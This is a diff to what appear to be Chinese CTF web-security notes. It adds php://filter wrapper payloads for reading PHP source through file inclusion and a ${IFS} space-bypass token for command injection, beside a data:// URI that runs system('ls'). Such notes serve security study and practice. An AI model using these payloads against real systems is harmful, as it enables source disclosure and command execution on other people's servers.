@@ -980,6 +980,18 @@ php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
 
 ```
 
+```php
+php://filter/resource=http://www.example.com        //没有进行任何过滤，直接读取
+php://filter/read=string.toupper/resource=xxx.php    //对文件的内容进行大写转换后读取
+php://filter/convert.base64-encode/resource=xxx.php        //对文件进行base64加密后读取
+php://filter/read=string.toupper|string.rot13/resource=xxx.php    //对文件的内容进行大写转换后并使用rot13加密后读取
+php://filter/write=string.rot13/resource=example.txt","Hello World    
+//这会通过 rot13 过滤器筛选出字符 "Hello World",然后写入当前目录下的 example.txt
+php://filter/read=string.rot13/resource=hello.php
+php://filter/string.rot13/resource=imposible.php
+
+```
+
 *payload*
 ```shell
 data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==
@@ -1124,7 +1136,7 @@ has-response-header:Content-Length：只显示响应头中包含 Content-Length 
 # 空格绕过
 
 ```
-
+${IFS}
 $()
 <
 $IFS$9
